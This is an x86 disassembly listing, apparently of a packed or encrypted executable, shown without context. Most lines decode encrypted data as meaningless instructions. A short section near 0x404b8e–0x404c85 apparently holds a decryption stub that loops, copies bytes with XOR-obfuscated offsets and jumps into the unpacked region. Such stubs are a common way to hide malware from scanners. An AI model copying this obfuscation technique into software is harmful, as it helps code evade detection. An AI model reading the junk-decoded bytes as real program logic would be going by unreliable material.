  4047f5:	pop    edx
  4047f6:	mov    al,ds:0x69f3e06f
  4047fb:	cdq    
  4047fc:	pop    ebx
  4047fd:	inc    esp
  4047fe:	fistp  WORD PTR [esi+edx*1+0x72]
  404802:	fsubr  DWORD PTR [ebx]
  404804:	mov    esp,0x408ee369
  404809:	push   ecx
  40480a:	mov    esp,0xd793fce6
  40480f:	inc    edx
  404810:	rcl    edi,1
  404812:	loope  0x404893
  404814:	retf   
  404815:	xlat   BYTE PTR ds:[ebx]
  404816:	fsubr  st(7),st
  404818:	adc    DWORD PTR [edi],esi
  40481a:	and    eax,0xefe3b4d2
  40481f:	jecxz  0x404802
  404821:	add    eax,0x7eb29880
  404826:	mov    edx,0xe45c3c91
  40482b:	mov    ds,WORD PTR [esi]
  40482d:	gs cdq 
  40482f:	test   eax,0xe50c7547
  404834:	push   eax
  404835:	out    dx,al
  404836:	mul    dh
  404838:	jmp    0x4047f7
  40483a:	lods   al,BYTE PTR ds:[esi]
  40483b:	rcr    esi,1
  40483d:	and    ebp,DWORD PTR [esi+0x1d]
  404840:	fs pushf 
  404842:	push   ss
  404843:	(bad)  
  404844:	lods   eax,DWORD PTR ds:[esi]
  404845:	and    DWORD PTR [ecx-0x57],0x6e55f3aa
  40484c:	cmp    eax,0x976aad66
  404851:	dec    edi
  404852:	lds    ebp,FWORD PTR [edi]
  404854:	jae    0x4048cf
  404856:	push   ds
  404857:	ins    DWORD PTR es:[edi],dx
  404858:	xor    esi,DWORD PTR [edx+0x7e0700de]
  40485e:	jns    0x404853
  404860:	data16 cmc 
  404862:	std    
  404863:	stos   DWORD PTR es:[edi],eax
  404864:	nop
  404865:	sbb    BYTE PTR [eax-0x40aa1f87],ah
  40486b:	pusha  
  40486c:	xchg   esp,eax
  40486d:	test   BYTE PTR [ebp-0x7f4e2295],ch
  404873:	xchg   BYTE PTR [esi-0x4c9ec632],al
  404879:	in     al,dx
  40487a:	dec    edi
  40487b:	sahf   
  40487c:	cmp    al,0x51
  40487e:	xor    dl,BYTE PTR ss:0xb6eb1cc0
  404885:	mov    WORD PTR [edi],?
  404887:	aas    
  404888:	(bad)  
  40488a:	jnp    0x404904
  40488c:	ins    BYTE PTR es:[edi],dx
  40488d:	lods   eax,DWORD PTR ds:[esi]
  40488e:	jle    0x404858
  404890:	in     eax,dx
  404891:	rcl    cl,1
  404893:	ror    DWORD PTR [esi-0x35],cl
  404896:	in     al,0xd3
  404898:	lock sub DWORD PTR [esi+0x72],edx
  40489c:	mov    eax,ds:0x51d32633
  4048a1:	inc    edx
  4048a2:	push   cs
  4048a3:	xchg   BYTE PTR [eax+0x1b3936de],dh
  4048a9:	lods   al,BYTE PTR ds:[esi]
  4048aa:	in     eax,0x76
  4048ac:	in     al,dx
  4048ad:	popa   
  4048ae:	test   al,0x5b
  4048b0:	(bad)  
  4048b1:	sti    
  4048b2:	dec    edi
  4048b3:	dec    edi
  4048b4:	pop    eax
  4048b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048b6:	push   cs
  4048b7:	lds    esp,FWORD PTR [eax+0x69]
  4048ba:	test   eax,0x5b41ca2f
  4048bf:	push   ds
  4048c0:	mov    ?,WORD PTR [esi+0x4]
  4048c3:	xor    DWORD PTR [ebx],edi
  4048c5:	cld    
  4048c6:	dec    ebp
  4048c7:	and    al,0xf8
  4048c9:	xor    edx,ecx
  4048cb:	adc    al,0xdb
  4048cd:	mov    bh,bl
  4048cf:	mov    al,ds:0x7521efe
  4048d4:	xchg   edi,eax
  4048d5:	xchg   edx,eax
  4048d6:	jne    0x40492b
  4048d8:	iret   
  4048d9:	scas   eax,DWORD PTR es:[edi]
  4048da:	add    BYTE PTR [edx-0x5ac4d26d],ch
  4048e0:	in     al,0xf
  4048e2:	mov    esi,0xe269a96b
  4048e7:	or     al,0x75
  4048e9:	xor    dl,al
  4048eb:	fucom  st(6)
  4048ed:	(bad)  
  4048ee:	fstp   TBYTE PTR [edi]
  4048f0:	addr16 mov bl,0xfa
  4048f3:	pop    ebp
  4048f4:	aam    0xde
  4048f6:	and    bh,BYTE PTR [esp+ecx*2]
  4048f9:	cdq    
  4048fa:	push   eax
  4048fb:	retf   
  4048fc:	add    edi,DWORD PTR [ebp+0x57]
  4048ff:	(bad)  
  404900:	mov    eax,cr1
  404903:	sbb    ebp,DWORD PTR [edx+ebp*1+0x0]
  404907:	dec    ecx
  404908:	mov    bh,0x30
  40490a:	add    BYTE PTR [esi+0x27],bh
  40490d:	add    DWORD PTR cs:[ecx+0x56192828],edi
  404914:	shl    ch,cl
  404916:	pop    es
  404917:	push   esp
  404918:	loope  0x404959
  40491a:	mov    ch,0xeb
  40491c:	psubb  mm2,mm0
  40491f:	outs   dx,BYTE PTR ds:[esi]
  404920:	jo     0x404932
  404922:	mov    ebp,0x31277bb3
  404927:	rcl    esp,cl
  404929:	pushf  
  40492a:	jne    0x404959
  40492c:	lea    ecx,[edi]
  40492e:	mov    edi,0x83dab917
  404933:	inc    esi
  404934:	and    al,0xd0
  404936:	test   DWORD PTR [ebx+ebp*4-0x20],edi
  40493a:	ja     0x404938
  40493c:	push   DWORD PTR [ebx+0x64]
  40493f:	inc    esp
  404940:	in     eax,0x95
  404942:	and    eax,0x5711b34a
  404947:	ds pushf 
  404949:	add    ebp,DWORD PTR [edx+0x3e02b20c]
  40494f:	push   0x2117ccbf
  404954:	aad    0x36
  404956:	mov    al,ds:0x5fea246b
  40495b:	je     0x4049c0
  40495d:	mov    esi,0xebe12f46
  404962:	fcom   QWORD PTR [edx+0x2]
  404965:	mov    dl,0xa7
  404967:	xchg   edi,eax
  404968:	sar    DWORD PTR [ebx+0x14af4211],0x63
  40496f:	(bad)  
  404970:	lock jnp 0x404902
  404973:	pop    edx
  404974:	lock bnd call 0xc7b828ef
  40497b:	xor    esi,edx
  40497d:	jg     0x404905
  40497f:	cld    
  404980:	mov    edi,0x73c69929
  404985:	push   eax
  404986:	popa   
  404987:	arpl   WORD PTR [ebx],bp
  404989:	mov    eax,ds:0xcbd7f9db
  40498e:	add    al,0x14
  404990:	aaa    
  404991:	icebp  
  404992:	icebp  
  404993:	or     edi,edx
  404995:	jbe    0x404950
  404997:	int3   
  404998:	in     al,0x72
  40499a:	add    esp,DWORD PTR [esi]
  40499c:	mov    ebp,DWORD PTR [edi-0x46]
  40499f:	adc    al,0x9e
  4049a1:	sub    al,0x7b
  4049a3:	in     eax,0x50
  4049a5:	mov    edx,0xbbcd530b
  4049aa:	xor    eax,0xcdd9f3c8
  4049af:	or     ah,BYTE PTR [ebp-0x1b4d0092]
  4049b5:	fimul  DWORD PTR [ebx+0x5664b7b8]
  4049bb:	pop    edx
  4049bc:	mov    dl,0xe9
  4049be:	lds    ebx,FWORD PTR [ebp+0x79ac42a0]
  4049c4:	jle    0x404a18
  4049c6:	mov    eax,0xf8b6aafe
  4049cb:	lods   al,BYTE PTR ds:[esi]
  4049cc:	in     al,dx
  4049cd:	jmp    0x404952
  4049cf:	jo     0x4049e6
  4049d1:	mov    cl,0xb0
  4049d3:	or     eax,0x99a99996
  4049d8:	inc    esi
  4049d9:	outs   dx,DWORD PTR ds:[esi]
  4049da:	or     BYTE PTR [ebx+0x5f],0xb9
  4049de:	push   ecx
  4049df:	js     0x404999
  4049e1:	ret    
  4049e2:	or     esp,ebx
  4049e4:	mov    esp,0x5eef26e2
  4049e9:	jl     0x404989
  4049eb:	aad    0x8e
  4049ed:	fmul   st,st(3)
  4049ef:	push   ecx
  4049f0:	cld    
  4049f1:	mov    eax,0xe5b50761
  4049f6:	mov    BYTE PTR [edx+edi*1-0x7858f54c],al
  4049fd:	or     bh,al
  4049ff:	ins    BYTE PTR es:[edi],dx
  404a00:	idiv   esi
  404a02:	scas   al,BYTE PTR es:[edi]
  404a03:	sti    
  404a04:	je     0x40499c
  404a06:	xchg   edx,eax
  404a07:	push   edi
  404a08:	mov    WORD PTR [ebx],?
  404a0a:	ret    
  404a0b:	xor    eax,0xf9842b1c
  404a10:	inc    eax
  404a11:	jbe    0x404a30
  404a13:	leave  
  404a14:	adc    esp,DWORD PTR [edx-0xbe65815]
  404a1a:	mov    ds:0xf2f048d2,al
  404a1f:	or     ah,dl
  404a21:	js     0x4049c2
  404a23:	sar    DWORD PTR [ebp+0x76],0xb9
  404a27:	adc    ah,BYTE PTR [eax]
  404a29:	hlt    
  404a2a:	fiadd  WORD PTR [ecx+0x535306b9]
  404a30:	ins    BYTE PTR es:[edi],dx
  404a31:	fcomp  DWORD PTR [eax-0x3eb9d48f]
  404a37:	adc    BYTE PTR [edi-0x3e],0x7e
  404a3b:	jmp    0x4049ef
  404a3d:	jg     0x4049d8
  404a3f:	call   0xf869:0x9e745908
  404a46:	jge    0x404a07
  404a48:	cmovns esp,DWORD PTR ds:0x4fce6b60
  404a4f:	dec    eax
  404a50:	mov    ebx,0xd28e057a
  404a55:	sbb    edx,DWORD PTR [edi+0x6959e70f]
  404a5b:	sub    ecx,DWORD PTR [edx-0x14]
  404a5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a5f:	loope  0x404a9f
  404a61:	jo     0x404a7b
  404a63:	ret    
  404a64:	loopne 0x404a55
  404a66:	mov    ds:0x672a973e,al
  404a6b:	int3   
  404a6c:	dec    ecx
  404a6d:	xchg   ebx,eax
  404a6e:	or     dx,bx
  404a71:	cmp    BYTE PTR [ecx-0x19],bl
  404a74:	mov    cl,BYTE PTR [esi]
  404a76:	add    eax,0xd6f1f810
  404a7b:	arpl   bp,bp
  404a7d:	in     eax,0xc1
  404a7f:	jmp    0xd361:0x8bed0aaa
  404a86:	ins    BYTE PTR es:[edi],dx
  404a87:	jae    0x404ac7
  404a89:	neg    BYTE PTR [ecx-0x412fabce]
  404a8f:	mov    ebp,DWORD PTR [edx+ebp*4-0x3e0361c0]
  404a96:	jne    0x404a6e
  404a98:	rol    DWORD PTR [eax],0xe
  404a9b:	shl    BYTE PTR [edi+0x2b8e05ec],0x88
  404aa2:	std    
  404aa3:	repnz sbb ebx,ecx
  404aa6:	icebp  
  404aa7:	push   ebp
  404aa8:	leave  
  404aa9:	cli    
  404aaa:	aaa    
  404aab:	and    eax,0x7efc0db1
  404ab0:	push   edi
  404ab1:	fwait
  404ab2:	sub    al,BYTE PTR [esi-0x64f0caa6]
  404ab8:	dec    edi
  404ab9:	(bad)
  404abc:	mov    eax,0xc645db9a
  404ac1:	sar    bh,0x30
  404ac4:	sub    al,0xcc
  404ac6:	ret    
  404ac7:	sbb    al,0x5c
  404ac9:	imul   edi,esp,0x3b080a98
  404acf:	retf   
  404ad0:	aam    0xb5
  404ad2:	and    ecx,eax
  404ad4:	and    ah,bl
  404ad6:	add    ecx,DWORD PTR [edi-0x3a8ef35d]
  404adc:	adc    BYTE PTR [edi-0x6ff43b0e],bh
  404ae2:	lods   al,BYTE PTR ds:[esi]
  404ae3:	rcr    BYTE PTR [ebx+0x6c],1
  404ae6:	sbb    BYTE PTR [ebx],0xa5
  404ae9:	inc    edx
  404aea:	in     al,0xc
  404aec:	hlt    
  404aed:	dec    esp
  404aee:	sar    DWORD PTR [ecx+0x7],1
  404af1:	and    cl,bl
  404af3:	jl     0x404b5c
  404af5:	xor    DWORD PTR [esi-0x39],ecx
  404af8:	cmp    ebp,DWORD PTR [eax+eax*4]
  404afb:	xor    eax,DWORD PTR [ecx+0x53]
  404afe:	adc    bh,0x1c
  404b01:	adc    al,0x73
  404b03:	je     0x404b0b
  404b05:	push   eax
  404b06:	push   0xffffff94
  404b08:	mov    esp,0xf9084452
  404b0d:	mov    fs,WORD PTR [esi]
  404b0f:	jg     0x404ad1
  404b11:	(bad)  
  404b12:	leave  
  404b13:	ins    DWORD PTR es:[edi],dx
  404b14:	imul   esi,eax,0xb945ad5
  404b1a:	add    eax,0xfd5d364e
  404b1f:	xor    ch,BYTE PTR [esi+0x395467eb]
  404b25:	out    0xeb,al
  404b27:	and    eax,0x8f97e13c
  404b2c:	test   eax,0x37c8980b
  404b31:	pandn  mm6,mm3
  404b34:	nop
  404b35:	jbe    0x404b55
  404b37:	call   0x64872f23
  404b3c:	mov    ecx,0xa7f7735c
  404b41:	or     bl,BYTE PTR [ecx]
  404b43:	inc    ebx
  404b44:	mov    WORD PTR [esi-0x34],es
  404b47:	dec    DWORD PTR [edi+0x3]
  404b4a:	in     eax,dx
  404b4b:	mov    ecx,0x354a2f59
  404b50:	mov    eax,0x9b6e5e62
  404b55:	mov    al,ds:0xd1d321ff
  404b5a:	inc    edi
  404b5b:	push   es
  404b5c:	xor    eax,0x1758030f
  404b61:	stos   DWORD PTR es:[edi],eax
  404b62:	push   0x6671c48e
  404b67:	xor    BYTE PTR [eax+0x49],dh
  404b6a:	ret    0xdba1
  404b6d:	retf   0xb26d
  404b70:	cmp    cl,BYTE PTR [ebp-0x3c]
  404b73:	sar    BYTE PTR [ecx-0x2f],cl
  404b76:	pop    ecx
  404b77:	loopne 0x404b20
  404b79:	mov    dh,0x4b
  404b7b:	icebp  
  404b7c:	enter  0x55f2,0x42
  404b80:	fmul   QWORD PTR [edi]
  404b82:	fld    TBYTE PTR [ecx]
  404b84:	scas   eax,DWORD PTR es:[edi]
  404b85:	or     DWORD PTR [edx+edi*1-0x7d],eax
  404b89:	sar    bh,1
  404b8b:	xor    eax,0x0
  404b8e:	add    DWORD PTR ds:0x431010,0x415e
  404b98:	mov    DWORD PTR [ebp-0xc],eax
  404b9b:	and    DWORD PTR ds:0x431018,0x0
  404ba5:	mov    eax,ds:0x431018
  404baa:	inc    eax
  404bab:	mov    ds:0x431018,eax
  404bb0:	cmp    DWORD PTR ds:0x431018,0x27
  404bb7:	jbe    0x404be2
  404bbd:	jmp    0x404bd5
  404bc2:	push   0x2a2f
  404bc7:	push   0x42e00c
  404bcc:	push   DWORD PTR [ebp-0x14]
  404bcf:	call   DWORD PTR ds:0x434907
  404bd5:	cmp    DWORD PTR ds:0x431018,0x1a
  404bdc:	jb     0x404ba5
  404be2:	push   ebx
  404be3:	xor    ebx,ebx
  404be5:	xor    edi,0x8a29a12f
  404beb:	mov    eax,ecx
  404bed:	add    eax,0xfabdbee5
  404bf2:	adc    ebx,0xffffffff
  404bf5:	xor    eax,0x8a29a12f
  404bfa:	xor    ebx,0x0
  404bfd:	cmp    eax,edi
  404bff:	jne    0x404c18
  404c05:	cmp    ebx,DWORD PTR [ebp-0xc]
  404c08:	je     0x404c80
  404c0e:	jmp    0x404c18
  404c13:	mov    esi,0x3272e4
  404c18:	mov    eax,DWORD PTR [ebp-0x4]
  404c1b:	mov    edi,DWORD PTR [ebp-0x8]
  404c1e:	xor    edi,edx
  404c20:	add    edi,esi
  404c22:	mov    esi,DWORD PTR [ebp+0x8]
  404c25:	imul   edi,ecx
  404c28:	mov    ebx,DWORD PTR [ebp+0xc]
  404c2b:	xor    eax,edx
  404c2d:	add    eax,ecx
  404c2f:	mov    al,BYTE PTR [ebx+eax*1+0x3272e4]
  404c36:	mov    BYTE PTR [edi+esi*1],al
  404c39:	mov    eax,DWORD PTR [ebp-0x8]
  404c3c:	mov    esi,DWORD PTR [ebp+0x10]
  404c3f:	xor    eax,edx
  404c41:	xor    ebx,ebx
  404c43:	add    esi,0xfabdbee5
  404c49:	adc    ebx,0xffffffff
  404c4c:	lea    ecx,[ecx+eax*1+0x3272e4]
  404c53:	xor    edi,edi
  404c55:	xor    esi,0x8a29a12f
  404c5b:	xor    ebx,0x0
  404c5e:	mov    eax,ecx
  404c60:	add    eax,0xfabdbee5
  404c65:	adc    edi,0xffffffff
  404c68:	xor    eax,0x8a29a12f
  404c6d:	xor    edi,0x0
  404c70:	cmp    eax,esi
  404c72:	jne    0x404c13
  404c78:	cmp    edi,ebx
  404c7a:	jne    0x404c13
  404c80:	mov    eax,0xf89c8580
  404c85:	jmp    0x40700d
  404c8a:	das    
  404c8b:	cmp    eax,DWORD PTR [edi]
  404c8d:	test   ebx,esi
  404c8f:	sub    DWORD PTR [edi+0x7717da73],0x1eae1c2c
  404c99:	dec    ebx
  404c9a:	pop    es
  404c9b:	pop    edi
  404c9c:	jb     0x404d10
  404c9e:	pop    es
  404c9f:	pop    edi
  404ca0:	jb     0x404d14
  404ca2:	and    eax,0x1dfb25cd
  404ca7:	push   ebx
  404ca8:	mov    edx,0x64533b05
  404cad:	sub    al,0x71
  404caf:	pop    ss
  404cb0:	adc    edi,esp
  404cb2:	cmp    DWORD PTR [edx],esp
  404cb4:	push   esp
  404cb5:	inc    edi
  404cb6:	pop    edi
  404cb7:	jbe    0x404c88
  404cb9:	and    edi,DWORD PTR [ecx+0x56393589]
  404cbf:	mov    ecx,0xf2bc0305
  404cc4:	dec    ebp
  404cc5:	inc    esp
  404cc6:	push   ecx
  404cc7:	mov    bl,0x9e
  404cc9:	mov    bh,BYTE PTR [ebx+0x77]
  404ccc:	int3   
  404ccd:	enter  0xe67d,0x21
  404cd1:	lods   eax,DWORD PTR ds:[esi]
  404cd2:	call   0x2620b700
  404cd7:	aas    
  404cd8:	push   ss
  404cd9:	bound  edx,QWORD PTR [ebp+0xe]
  404cdc:	aad    0x29
  404cde:	ins    DWORD PTR es:[di],dx
  404ce0:	js     0x404d1e
  404ce2:	jp     0x404d61
  404ce4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ce5:	push   ss
  404ce6:	dec    esi
  404ce7:	mov    ah,0xea
  404ce9:	jbe    0x404c91
  404ceb:	in     al,0xb1
  404ced:	stos   BYTE PTR es:[edi],al
  404cee:	cmp    edx,DWORD PTR [esi+eiz*8]
  404cf1:	mov    ah,0x35
  404cf3:	xlat   BYTE PTR gs:[ebx]
  404cf5:	mov    al,ds:0x6a44d5fd
  404cfa:	ins    BYTE PTR es:[edi],dx
  404cfb:	dec    ebp
  404cfc:	pop    esp
  404cfd:	lock add BYTE PTR fs:[esi-0x6549249b],dh
  404d05:	cmp    eax,0x7f06613e
  404d0a:	repnz mov al,ds:0x9e27b25
  404d10:	lods   al,BYTE PTR ds:[esi]
  404d11:	pop    eax
  404d12:	xchg   BYTE PTR [edi+0x74],dh
  404d15:	test   BYTE PTR [ebp+0x591846ba],al
  404d1b:	xor    ebx,edi
  404d1d:	inc    edx
  404d1e:	adc    eax,0xdf8af140
  404d23:	mov    ecx,0x663624b8
  404d28:	fdivr  st,st(4)
  404d2a:	push   edx
  404d2b:	fnstcw WORD PTR [edi]
  404d2d:	sar    dl,1
  404d2f:	ja     0x404cbf
  404d31:	mov    dh,0x9c
  404d33:	pop    esp
  404d34:	scas   al,BYTE PTR es:[edi]
  404d35:	imul   ebx,DWORD PTR [eax-0xd],0xffffff80
  404d39:	and    cl,BYTE PTR [edx]
  404d3b:	aad    0x1
  404d3d:	mov    al,0x46
  404d3f:	mov    esi,0xa9cc3dc8
  404d44:	push   0x3c
  404d46:	jge    0x404d3c
  404d48:	ja     0x404da6
  404d4a:	fmul   QWORD PTR [ebp-0x33]
  404d4d:	daa    
  404d4e:	cmp    al,0xe6
  404d50:	mov    ecx,0x4e3c1c99
  404d55:	test   al,0x42
  404d57:	dec    esp
  404d58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d59:	adc    bh,cl
  404d5b:	aas    
  404d5c:	pop    ss
  404d5d:	xchg   ebp,eax
  404d5e:	rol    BYTE PTR [eax+0x23],1
  404d61:	add    ebx,esi
  404d63:	ror    esp,0x55
  404d66:	in     eax,0x40
  404d68:	adc    DWORD PTR [ecx-0x5308f7dd],ebx
  404d6e:	shr    DWORD PTR [esi-0x1a],cl
  404d71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d72:	imul   edx,DWORD PTR [edi],0x2dee2316
  404d78:	dec    esi
  404d79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d7a:	cmp    ch,dl
  404d7c:	xchg   edx,eax
  404d7d:	or     eax,0xe57c0115
  404d82:	add    al,0x9b
  404d84:	cmp    DWORD PTR [esp+ebp*2+0x2d],ebp
  404d88:	pcmpeqb mm1,QWORD PTR [ecx+0x3eda01e4]
  404d8f:	mov    WORD PTR [ecx-0x71],ss
  404d92:	icebp  
  404d93:	mov    edx,0xe17f4ffd
  404d98:	cs mov ecx,0x831460ca
  404d9e:	retf   
  404d9f:	jmp    0x283c:0x93e22796
  404da6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404da7:	test   DWORD PTR [eax+0x7],eax
  404daa:	mov    al,0xeb
  404dac:	pop    ebx
  404dad:	rol    esi,1
  404daf:	fdivr  QWORD PTR [esi-0x21d8a377]
  404db5:	retf   
  404db6:	cmp    eax,DWORD PTR ds:0x43b5d852
  404dbc:	loope  0x404d8c
  404dbe:	sar    DWORD PTR [ecx-0x1750073],1
  404dc4:	inc    esi
  404dc5:	jmp    0x404ded
  404dc7:	test   al,0x1
  404dc9:	test   BYTE PTR [eax],0xd3
  404dcc:	inc    esp
  404dcd:	sub    eax,0xf0c09689
  404dd2:	fcom   st(2)
  404dd4:	mov    edi,0x30ebd51d
  404dd9:	int    0xff
  404ddb:	cdq    
  404ddc:	mov    ebp,DWORD PTR [ebx+0x26b38886]
  404de2:	push   ecx
  404de3:	or     al,BYTE PTR [edx-0xa]
  404de6:	pop    ss
  404de7:	test   eax,0x77406d84
  404dec:	popf   
  404ded:	or     eax,DWORD PTR [esi+eiz*1+0x11]
  404df1:	adc    ebx,ecx
  404df3:	xchg   BYTE PTR [ebp+0x2c],al
  404df6:	sub    eax,0xd8e5b9b5
  404dfb:	dec    edi
  404dfc:	jb     0x404e29
  404dfe:	cmp    eax,DWORD PTR [edx+0x756086b5]
  404e04:	jns    0x404e65
  404e06:	push   es
  404e07:	retf   
  404e08:	int    0x3d
  404e0a:	test   al,0x4f
  404e0c:	aad    0x99
  404e0e:	out    0xf3,eax
  404e10:	xor    DWORD PTR [edi+ebp*1+0x71],0xd8cd7467
  404e18:	add    esi,esp
  404e1a:	mov    dh,0xdf
  404e1c:	jbe    0x404e91
  404e1e:	push   eax
  404e1f:	aaa    
  404e20:	and    DWORD PTR [esi+0x49],esi
  404e23:	(bad)  
  404e25:	sbb    eax,eax
  404e27:	sub    ebp,ecx
  404e29:	iret   
  404e2a:	cs jmp 0x404e99
  404e2d:	fistp  QWORD PTR [eax+edx*2]
  404e30:	and    esp,ecx
  404e32:	jmp    0x404e4b
  404e34:	ficom  DWORD PTR [esi-0x59]
  404e37:	lock xchg DWORD PTR [ebx],esp
  404e3a:	pop    ecx
  404e3b:	fsub   QWORD PTR [edx+0x38]
  404e3e:	(bad)  
  404e40:	bound  esp,QWORD PTR [ebx+0x20]
  404e43:	sub    al,0x81
  404e45:	out    dx,eax
  404e46:	fist   WORD PTR [ebx+0xf54e46d]
  404e4c:	push   edi
  404e4d:	popf   
  404e4e:	pushf  
  404e4f:	or     ch,al
  404e51:	loopne 0x404e33
  404e53:	repz imul ebp,DWORD PTR [ebp+0x3261bb07],0x43985b1c
  404e5e:	mov    cl,0x24
  404e60:	call   0xb7e3:0xc21ead11
  404e67:	loope  0x404e21
  404e69:	mov    dl,BYTE PTR [edx-0x3c]
  404e6c:	cld    
  404e6d:	xchg   BYTE PTR [ecx],dh
  404e6f:	lods   al,BYTE PTR ds:[esi]
  404e70:	xor    eax,0x312695a5
  404e75:	test   BYTE PTR [edi],0x43
  404e78:	dec    edi
  404e79:	das    
  404e7a:	and    BYTE PTR [ebx+0x6],ch
  404e7d:	and    al,0xda
  404e7f:	xchg   esp,eax
  404e80:	imul   dh
  404e82:	dec    eax
  404e83:	cmp    eax,0x9001680b
  404e88:	ror    BYTE PTR [eax-0x15],1
  404e8b:	fstp   TBYTE PTR [edx]
  404e8d:	inc    edx
  404e8e:	lahf   
  404e8f:	shl    eax,1
  404e91:	push   ebp
  404e92:	push   ss
  404e93:	mov    ch,0x1c
  404e95:	call   0x32884165
  404e9a:	std    
  404e9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e9c:	mov    esi,0x9c6a0df8
  404ea1:	rol    BYTE PTR [edi],cl
  404ea3:	icebp  
  404ea4:	cmp    DWORD PTR [edi+ebx*1],ebp
  404ea7:	dec    ebp
  404ea8:	sbb    eax,edi
  404eaa:	aaa    
  404eab:	add    edi,esp
  404ead:	add    eax,0x83c5221
  404eb2:	retf   0x75a5
  404eb5:	sub    ah,BYTE PTR [esi+0x1c9e085f]
  404ebb:	pminsw mm5,mm3
  404ebe:	pop    esi
  404ebf:	mov    cl,0x71
  404ec1:	arpl   WORD PTR [ebp-0x6831c45c],cx
  404ec7:	pop    ecx
  404ec8:	jmp    0xac2a21e6
  404ecd:	mov    ch,0x4f
  404ecf:	test   bh,ch
  404ed1:	fcomp  DWORD PTR [edi-0x2b2f52ee]
  404ed7:	add    al,0x5e
  404ed9:	dec    esi
  404eda:	inc    edx
  404edb:	jae    0x404ec2
  404edd:	cmp    DWORD PTR ds:0x10ad8be4,ebp
  404ee3:	xor    DWORD PTR [eax-0x185b2a4c],ebp
  404ee9:	adc    eax,0xb41b0c3e
  404eee:	sbb    dh,BYTE PTR [edx+eiz*2]
  404ef1:	rcr    ecx,0x7a
  404ef4:	in     eax,dx
  404ef5:	push   ecx
  404ef6:	shl    dl,0x96
  404ef9:	popw   es
  404efb:	imul   edi,DWORD PTR [edi+edi*4-0x73],0xddaac73a
  404f03:	push   cs
  404f04:	and    eax,0x4e6565bf
  404f09:	push   ecx
  404f0a:	jne    0x404f59
  404f0c:	sbb    al,0xda
  404f0e:	(bad)  
  404f0f:	mov    al,0x58
  404f11:	mov    bl,0x68
  404f13:	arpl   WORD PTR [esi+ecx*8+0x54],ax
  404f17:	mov    dh,0x40
  404f19:	mov    dh,0x40
  404f1b:	dec    eax
  404f1c:	test   al,0x83
  404f1e:	outs   dx,BYTE PTR ds:[esi]
  404f1f:	xchg   edi,eax
  404f20:	ja     0x404f06
  404f22:	leave  
  404f23:	pop    esi
  404f24:	ret    0x14e0
  404f27:	push   ebp
  404f28:	das    
  404f29:	or     dh,BYTE PTR [edi-0x374f46b0]
  404f2f:	dec    eax
  404f30:	jp     0x404ed8
  404f32:	dec    esi
  404f33:	mov    ch,0x7f
  404f35:	push   cs
  404f36:	adc    bh,BYTE PTR [ebx]
  404f38:	repz (bad) 
  404f3a:	dec    ebp
  404f3b:	retf   
  404f3c:	rcr    DWORD PTR [edx-0x7a],1
  404f3f:	adc    al,0xbe
  404f41:	popf   
  404f42:	mov    ebx,0x6e639a96
  404f47:	xchg   ecx,eax
  404f48:	mov    al,0xa8
  404f4a:	push   es
  404f4b:	adc    BYTE PTR [ebp-0x6385b022],cl
  404f51:	gs imul edx,eax,0x63115545
  404f58:	retf   
  404f59:	and    DWORD PTR [esi+0x77],esi
  404f5c:	dec    edi
  404f5d:	imul   ecx,DWORD PTR [edi],0x1853eb0f
  404f63:	xchg   edx,eax
  404f64:	outs   dx,DWORD PTR ds:[esi]
  404f65:	jb     0x404fe5
  404f67:	cld    
  404f68:	js     0x404efe
  404f6a:	push   ds
  404f6b:	xor    eax,0x3a66ab63
  404f70:	or     DWORD PTR [esp+eax*4-0x16d0b02b],esi
  404f77:	mov    dl,0xf1
  404f79:	aaa    
  404f7a:	sbb    eax,0x55ee529
  404f7f:	loope  0x404fea
  404f81:	sbb    BYTE PTR ds:0x86c0f273,dl
  404f87:	scas   al,BYTE PTR es:[edi]
  404f88:	pop    ecx
  404f89:	mov    ah,0xf0
  404f8b:	imul   ebx,DWORD PTR [edx-0x28dbfccf],0x1e2fca3f
  404f95:	ret    
  404f96:	outs   dx,DWORD PTR ds:[esi]
  404f97:	or     eax,0x3bad5db1
  404f9c:	jp     0x404f57
  404f9e:	sbb    DWORD PTR [esi+0x62],ebp
  404fa1:	aad    0xa1
  404fa3:	pop    ds
  404fa4:	daa    
  404fa5:	cdq    
  404fa6:	pop    edi
  404fa7:	xchg   edi,eax
  404fa8:	ja     0x404ff9
  404faa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404fab:	jae    0x404f98
  404fad:	ret    0x3bec
  404fb0:	fst    DWORD PTR [ecx+0x3b9d5d13]
  404fb6:	dec    esp
  404fb7:	jp     0x404f97
  404fb9:	push   ebx
  404fba:	inc    edi
  404fbb:	mov    esp,0xf012705b
  404fc0:	jbe    0x405013
  404fc2:	scas   eax,DWORD PTR es:[edi]
  404fc3:	add    al,0xa6
  404fc5:	xchg   BYTE PTR [ebx-0x182de897],dh
  404fcb:	fcmovnb st,st(2)
  404fcd:	inc    esi
  404fce:	loop   0x405017
  404fd0:	mov    bh,0x89
  404fd2:	stos   BYTE PTR es:[edi],al
  404fd3:	adc    eax,0xe8aeaf77
  404fd8:	mov    DWORD PTR [eax+0x44],ecx
  404fdb:	or     BYTE PTR [edi-0x45],bl
  404fde:	and    BYTE PTR [ebp+0x3d],cl
  404fe1:	fstp   TBYTE PTR [eax-0x21]
  404fe4:	aad    0x40
  404fe6:	push   ebx
  404fe7:	inc    ebp
  404fe8:	cmc    
  404fe9:	xor    eax,0xa1a74aba
  404fee:	push   ebx
  404fef:	aam    0xee
  404ff1:	sahf   
  404ff2:	or     DWORD PTR [ecx+0x76],edx
  404ff5:	push   ss
  404ff6:	out    0x5e,al
  404ff8:	dec    edx
  404ff9:	push   eax
  404ffa:	mov    BYTE PTR [ebx+0x194f3cb],bh
  405000:	and    dl,ch
  405002:	sub    al,0x2b
  405004:	repnz mov esp,0xcaf47a0d
  40500a:	sub    edi,eax
  40500c:	btr    DWORD PTR [ebx+ebp*1-0x1b],edx
  405011:	xor    DWORD PTR [esi+0x25bdd21],esp
  405017:	adc    ah,cl
  405019:	pop    es
  40501a:	pop    es
  40501b:	dec    edx
  40501c:	mov    ss,WORD PTR [edx]
  40501e:	in     al,0x50
